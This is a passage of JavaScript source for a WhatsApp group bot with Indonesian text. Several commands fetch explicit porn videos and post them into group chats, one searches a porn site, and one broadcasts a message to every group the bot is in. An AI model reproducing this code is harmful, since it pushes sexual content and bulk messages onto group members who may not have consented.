znn.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep16':
if (!isGroup) return onlyGroup()
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
znn.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep17':
if (!isGroup) return onlyGroup()
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
znn.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep18':
if (!isGroup) return onlyGroup()
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
znn.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case'xnxxs':
{
if (!text) return reply(`*Gunakan Dengan*\n\nexample : ${prefix+command} bokep nenek`)
let anu = await fetchJson(`https://skizo.tech/api/xnxxsearch?title=${text}&apikey=${global.skizo}`)
let teks = ``
for (let v of anu) {
teks += `*Title* : ${v.title}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}
reply(teks) 
}
break
case "boton":{
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
let ntahlahh9 = `./assets/audio/IMLEK.mp3`
let getGroups = await znn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `*[!] ANNOUNCEMENT*📢\n\n_BOT telah online, sekarang anda bisa menjadi bot clone dengan cara, *ketik .jadibot* dan *ketik .menu* untuk melihat daftar list yang disediakan oleh BOT_`
const buf = await getBuffer(`https://img.moehu.org/pic.php?id=mrfz`)
for (let x of data) {
await znn.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await znn.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await delay(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case 'gcbot': {
if (!isGroup) return onlyGroup()
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363156560553267@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
	"groupName": "PROJECT znn",
	"previewType": "PHOTO",
"renderLargerThumbnail": true,
	"jpegThumbnail": "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",
	"caption": "no cap, no pretending, no need a mentions"
}
}), { userJid: m.chat, quoted: m })
znn.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'inviteadmin':
if(!isCreator) return reply(mess.owner)
var newsletterAdminInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
"newsletterJid": global.idsal,
"newsletterName": "Circle Bot Community",
"jpegThumbnail": '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